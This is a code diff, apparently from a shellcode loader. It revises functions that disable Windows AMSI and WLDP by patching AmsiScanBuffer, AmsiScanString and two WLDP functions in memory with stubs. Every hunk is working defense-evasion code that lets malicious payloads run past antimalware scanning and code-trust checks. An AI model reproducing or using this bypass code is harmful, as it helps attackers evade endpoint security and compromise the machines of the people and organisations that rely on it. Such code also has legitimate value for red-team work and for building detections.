@@ -95,11 +95,13 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
     DWORD   len, op, t;
     LPVOID  cs, func_ptr;
 
-    // try load amsi
+    // try load amsi. if unable, assume DLL doesn't exist
+    // and return TRUE to indicate it's okay to continue
     dll = inst->api.LoadLibraryA(inst->amsi.s);    
-    if(dll == NULL) return FALSE;
+    if(dll == NULL) return TRUE;
     
-    // resolve address of AmsiScanBuffer
+    // resolve address of AmsiScanBuffer. if not found,
+    // return FALSE because it should exist ...
     cs = inst->api.GetProcAddress(dll, inst->amsiScanBuf);
     if(cs == NULL) return FALSE;
     
@@ -109,20 +111,22 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
     
     DPRINT("Length of AmsiScanBufferStub is %" PRIi32 " bytes.", len);
     
+    // check for negative length. this would only happen when
+    // compiler decides to re-order functions.
     if((int)len < 0) return FALSE;
     
-    // make the memory writeable
-    if(inst->api.VirtualProtect(
-      cs, len, PAGE_EXECUTE_READWRITE, &op))
-    {
-      DPRINT("Overwriting AmsiScanBuffer");
-      // over write with virtual address of stub
-      Memcpy(cs, ADR(PCHAR, AmsiScanBufferStub), len);   
-      // set memory back to original protection
-      inst->api.VirtualProtect(cs, len, op, &t);
-    }
+    // make the memory writeable. return FALSE on error
+    if(!inst->api.VirtualProtect(
+      cs, len, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
+      
+    DPRINT("Overwriting AmsiScanBuffer");
+    // over write with virtual address of stub
+    Memcpy(cs, ADR(PCHAR, AmsiScanBufferStub), len);   
+    // set memory back to original protection
+    inst->api.VirtualProtect(cs, len, op, &t);
   
-    // resolve address of AmsiScanString
+    // resolve address of AmsiScanString. if not found,
+    // return FALSE because it should exist ...
     cs = inst->api.GetProcAddress(dll, inst->amsiScanStr);
     if(cs == NULL) return FALSE;
     
@@ -132,18 +136,20 @@ BOOL DisableAMSI(PDONUT_INSTANCE inst) {
      
     DPRINT("Length of AmsiScanStringStub is %" PRIi32 " bytes.", len);
     
+    // check for negative length. this would only happen when
+    // compiler decides to re-order functions.
     if((int)len < 0) return FALSE;
     
     // make the memory writeable
-    if(inst->api.VirtualProtect(
-      cs, len, PAGE_EXECUTE_READWRITE, &op))
-    {
-      DPRINT("Overwriting AmsiScanString");
-      // over write with virtual address of stub
-      Memcpy(cs, ADR(PCHAR, AmsiScanStringStub), len);   
-      // set memory back to original protection
-      inst->api.VirtualProtect(cs, len, op, &t);
-    }
+    if(!inst->api.VirtualProtect(
+      cs, len, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
+      
+    DPRINT("Overwriting AmsiScanString");
+    // over write with virtual address of stub
+    Memcpy(cs, ADR(PCHAR, AmsiScanStringStub), len);   
+    // set memory back to original protection
+    inst->api.VirtualProtect(cs, len, op, &t);
+    
     return TRUE;
 }
 
@@ -300,11 +306,13 @@ BOOL DisableWLDP(PDONUT_INSTANCE inst) {
     DWORD   len, op, t;
     LPVOID  cs, func_ptr;
     
-    // try load wldp
+    // try load wldp. if unable, assume DLL doesn't exist
+    // and return TRUE to indicate it's okay to continue
     wldp = inst->api.LoadLibraryA(inst->wldp);  
-    if(wldp == NULL) return FALSE;
+    if(wldp == NULL) return TRUE;
     
     // resolve address of WldpQueryDynamicCodeTrust
+    // if not found, return FALSE because it should exist
     cs = inst->api.GetProcAddress(wldp, inst->wldpQuery);
     if(cs == NULL) return FALSE;
     
@@ -314,19 +322,21 @@ BOOL DisableWLDP(PDONUT_INSTANCE inst) {
       
     DPRINT("Length of WldpQueryDynamicCodeTrustStub is %" PRIi32 " bytes.", len);
     
+    // check for negative length. this would only happen when
+    // compiler decides to re-order functions.
     if((int)len < 0) return FALSE;
     
-    // make the memory writeable
-    if(inst->api.VirtualProtect(
-      cs, len, PAGE_EXECUTE_READWRITE, &op))
-    {
-      // overwrite with virtual address of stub
-      Memcpy(cs, ADR(PCHAR, WldpQueryDynamicCodeTrustStub), len);
-      // set back to original protection
-      inst->api.VirtualProtect(cs, len, op, &t);
-    }
+    // make the memory writeable. return FALSE on error
+    if(!inst->api.VirtualProtect(
+      cs, len, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
+      
+    // overwrite with virtual address of stub
+    Memcpy(cs, ADR(PCHAR, WldpQueryDynamicCodeTrustStub), len);
+    // set back to original protection
+    inst->api.VirtualProtect(cs, len, op, &t);
     
     // resolve address of WldpIsClassInApprovedList
+    // if not found, return FALSE because it should exist
     cs = inst->api.GetProcAddress(wldp, inst->wldpIsApproved);
     if(cs == NULL) return FALSE;
     
@@ -336,17 +346,19 @@ BOOL DisableWLDP(PDONUT_INSTANCE inst) {
     
     DPRINT("Length of WldpIsClassInApprovedListStub is %" PRIi32 " bytes.", len);
     
+    // check for negative length. this would only happen when
+    // compiler decides to re-order functions.
     if((int)len < 0) return FALSE;
     
-    // make the memory writeable
-    if(inst->api.VirtualProtect(
-      cs, len, PAGE_EXECUTE_READWRITE, &op))
-    {
-      // overwrite with virtual address of stub
-      Memcpy(cs, ADR(PCHAR, WldpIsClassInApprovedListStub), len);
-      // set back to original protection
-      inst->api.VirtualProtect(cs, len, op, &t);
-    }
+    // make the memory writeable. return FALSE on error
+    if(!inst->api.VirtualProtect(
+      cs, len, PAGE_EXECUTE_READWRITE, &op)) return FALSE;
+      
+    // overwrite with virtual address of stub
+    Memcpy(cs, ADR(PCHAR, WldpIsClassInApprovedListStub), len);
+    // set back to original protection
+    inst->api.VirtualProtect(cs, len, op, &t);
+    
     return TRUE;
 }
 #elif defined(BYPASS_WLDP_B)
